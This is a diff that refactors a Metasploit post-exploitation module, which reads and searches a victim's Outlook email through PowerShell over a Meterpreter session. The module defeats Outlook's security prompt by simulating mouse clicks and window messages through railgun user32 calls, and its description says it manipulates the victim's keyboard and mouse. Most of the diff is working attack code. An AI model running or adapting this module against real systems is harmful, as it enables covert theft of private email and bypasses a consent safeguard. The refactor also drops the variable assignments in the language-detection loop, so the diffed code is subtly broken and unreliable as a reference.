@@ -1,61 +1,78 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::Powershell
 
-  A_HASH = { "en_US" => "Allow", "nl_NL" => "Toestaan", "de_DE" => "Erteilen", "de_AT" => "Erteilen" }
-  ACF_HASH = { "en_US" => "Allow access for", "nl_NL" => "Toegang geven voor", "de_DE" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr", "de_AT" => "Zugriff gew\xc3\xa4hren f\xc3\xbcr" }
+  A_HASH = { 'en_US' => 'Allow', 'nl_NL' => 'Toestaan', 'de_DE' => 'Erteilen', 'de_AT' => 'Erteilen' }
+  ACF_HASH = { 'en_US' => 'Allow access for', 'nl_NL' => 'Toegang geven voor', 'de_DE' => "Zugriff gew\xc3\xa4hren f\xc3\xbcr", 'de_AT' => "Zugriff gew\xc3\xa4hren f\xc3\xbcr" }
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Gather Outlook Email Messages',
-      'Description'   => %q{
-        This module allows reading and searching email messages from the local
-        Outlook installation using PowerShell. Please note that this module is
-        manipulating the victims keyboard/mouse.  If a victim is active on the target
-        system, he may notice the activities of this module. Tested on Windows 8.1
-        x64 with Office 2013.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
-      'References'    => [ 'URL', 'https://forsec.nl/2014/11/reading-outlook-using-metasploit' ],
-      'Platform'      => [ 'win' ],
-      'Arch'          => [ 'x86', 'x64' ],
-      'SessionTypes'  => [ 'meterpreter' ],
-      'Actions'       => [
-        [ 'LIST', { 'Description' => 'Lists all folders' } ],
-        [ 'SEARCH', { 'Description' => 'Searches for an email' } ]
-      ],
-      'DefaultAction' => 'LIST'
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Outlook Email Messages',
+        'Description' => %q{
+          This module allows reading and searching email messages from the local
+          Outlook installation using PowerShell. Please note that this module is
+          manipulating the victims keyboard/mouse.  If a victim is active on the target
+          system, he may notice the activities of this module. Tested on Windows 8.1
+          x64 with Office 2013.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Wesley Neelen <security[at]forsec.nl>' ],
+        'References' => [ 'URL', 'https://forsec.nl/2014/11/reading-outlook-using-metasploit' ],
+        'Platform' => [ 'win' ],
+        'Arch' => [ ARCH_X86, ARCH_X64 ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Actions' => [
+          [ 'LIST', { 'Description' => 'Lists all folders' } ],
+          [ 'SEARCH', { 'Description' => 'Searches for an email' } ]
+        ],
+        'DefaultAction' => 'LIST',
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_railgun_api
+              stdapi_sys_config_sysinfo
+              stdapi_ui_get_idle_time
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
-    [
-      OptString.new('FOLDER', [ false, 'The e-mailfolder to read (e.g. Inbox)' ]),
-      OptString.new('KEYWORD', [ false, 'Search e-mails by the keyword specified here' ]),
-      OptString.new('A_TRANSLATION', [ false, 'Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
-      OptString.new('ACF_TRANSLATION', [ false, 'Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ])
-    ], self.class)
+      [
+        OptString.new('FOLDER', [ false, 'The e-mailfolder to read (e.g. Inbox)' ]),
+        OptString.new('KEYWORD', [ false, 'Search e-mails by the keyword specified here' ]),
+        OptString.new('A_TRANSLATION', [ false, 'Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
+        OptString.new('ACF_TRANSLATION', [ false, 'Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ])
+      ]
+    )
 
     register_advanced_options(
-    [
-      OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any Powershell scripts to complete', 120])
-    ], self.class)
+      [
+        OptInt.new('TIMEOUT', [true, 'The maximum time (in seconds) to wait for any PowerShell scripts to complete', 120])
+      ]
+    )
   end
 
   def execute_outlook_script(command)
-    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "outlook.ps1"))
+    base_script = File.read(File.join(Msf::Config.data_directory, 'post', 'powershell', 'outlook.ps1'))
     psh_script = base_script << command
     compressed_script = compress_script(psh_script)
-    cmd_out, runnings_pids, open_channels = execute_script(compressed_script, datastore['TIMEOUT'])
-    while(d = cmd_out.channel.read)
-      print ("#{d}")
+    cmd_out, = execute_script(compressed_script, datastore['TIMEOUT'])
+    while (d = cmd_out.channel.read)
+      print(d)
     end
     currentidle = session.ui.idle_time
     vprint_status("System has currently been idle for #{currentidle} seconds")
@@ -68,78 +85,78 @@ class MetasploitModule < Msf::Post
   end
 
   # This functions reads Outlook using powershell scripts
-  def read_emails(folder,keyword,atrans,acftrans)
-    view = framework.threads.spawn("ButtonClicker", false) {
-      click_button(atrans,acftrans)
-    }
+  def read_emails(folder, keyword, atrans, acftrans)
+    framework.threads.spawn('ButtonClicker', false) do
+      click_button(atrans, acftrans)
+    end
     command = "Get-Emails \"#{keyword}\" \"#{folder}\""
     execute_outlook_script(command)
   end
 
   # This functions clicks on the security notification generated by Outlook.
-  def click_button(atrans,acftrans)
-    sleep 1
-    hwnd = client.railgun.user32.FindWindowW(nil, "Microsoft Outlook")
-    if hwnd != 0
-      hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "&#{acftrans}")
-      client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
-      client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
-      hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
-      client.railgun.user32.SetActiveWindow(hwndChild['return'])
-      client.railgun.user32.SetForegroundWindow(hwndChild['return'])
-      client.railgun.user32.SetCursorPos(150,150)
-      client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
-      client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
-    else
-      print_error("Error while clicking on the Outlook security notification. Window could not be found")
+  def click_button(atrans, acftrans)
+    sleep(1)
+    hwnd = client.railgun.user32.FindWindowW(nil, 'Microsoft Outlook')
+    if hwnd == 0
+      print_error('Error while clicking on the Outlook security notification. Window could not be found')
+      return
     end
+
+    hwnd_child_ck = client.railgun.user32.FindWindowExW(hwnd['return'], nil, 'Button', "&#{acftrans}")
+    client.railgun.user32.SendMessageW(hwnd_child_ck['return'], 0x00F1, 1, nil)
+    client.railgun.user32.MoveWindow(hwnd['return'], 150, 150, 1, 1, true)
+    hwnd_child = client.railgun.user32.FindWindowExW(hwnd['return'], nil, 'Button', atrans.to_s)
+    client.railgun.user32.SetActiveWindow(hwnd_child['return'])
+    client.railgun.user32.SetForegroundWindow(hwnd_child['return'])
+    client.railgun.user32.SetCursorPos(150, 150)
+    client.railgun.user32.mouse_event(0x0002, 150, 150, nil, nil)
+    client.railgun.user32.SendMessageW(hwnd_child['return'], 0x00F5, 0, nil)
   end
 
-  # Main method
+  def outlook_installed?
+    key_base = 'HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676'
+    installed = registry_getvaldata("#{key_base}\\", 'NextAccountID')
+
+    if installed.blank? || installed == 0
+      return false
+    end
+
+    true
+  end
+
   def run
     folder	= datastore['FOLDER']
     keyword = datastore['KEYWORD'].to_s
-    allow 	= datastore['A_TRANSLATION']
+    allow	= datastore['A_TRANSLATION']
     allow_access_for = datastore['ACF_TRANSLATION']
-    langNotSupported = true
+    lang_not_supported = true
 
     # OS language check
-    sysLang = client.sys.config.sysinfo['System Language']
-    A_HASH.each do |key, val|
-      if sysLang == key
-        langNotSupported = false
-        atrans = A_HASH[sysLang]
-        acftrans = ACF_HASH[sysLang]
-      end
+    sys_lang = client.sys.config.sysinfo['System Language']
+    A_HASH.each_key do |key|
+      next unless sys_lang == key
+
+      lang_not_supported = false
+      A_HASH[sys_lang]
+      ACF_HASH[sys_lang]
     end
 
-    if allow and allow_access_for
+    if allow && allow_access_for
       atrans = allow
       acftrans = allow_access_for
-    else
-      if langNotSupported == true
-        fail_with(Failure::Unknown, "System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
-      end
+    elsif lang_not_supported == true
+      fail_with(Failure::Unknown, 'System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)')
     end
 
     # Outlook installed
-    @key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
-    outlookInstalled = registry_getvaldata("#{@key_base}\\", "NextAccountID")
+    fail_with(Failure::Unknown, 'Outlook is not installed') unless outlook_installed?
 
-    if !outlookInstalled.nil?
-      if outlookInstalled != 0
-        print_good "Outlook is installed"
-      else
-        fail_with(Failure::Unknown, "Outlook is not installed")
-      end
-    end
+    print_good 'Outlook is installed'
 
-    # Powershell installed check
-    if have_powershell?
-      print_good("PowerShell is installed.")
-    else
-      fail_with(Failure::Unknown, "PowerShell is not installed")
-    end
+    # PowerShell installed check
+    fail_with(Failure::Unknown, 'PowerShell is not installed') unless have_powershell?
+
+    print_good('PowerShell is installed.')
 
     # Check whether target system is locked
     locked = client.railgun.user32.GetForegroundWindow()['return']
@@ -152,7 +169,7 @@ class MetasploitModule < Msf::Post
       print_good('Available folders in the mailbox: ')
       list_boxes
     when 'SEARCH'
-      read_emails(folder,keyword,atrans,acftrans)
+      read_emails(folder, keyword, atrans, acftrans)
     else
       print_error("Unknown Action: #{action.name}")
     end
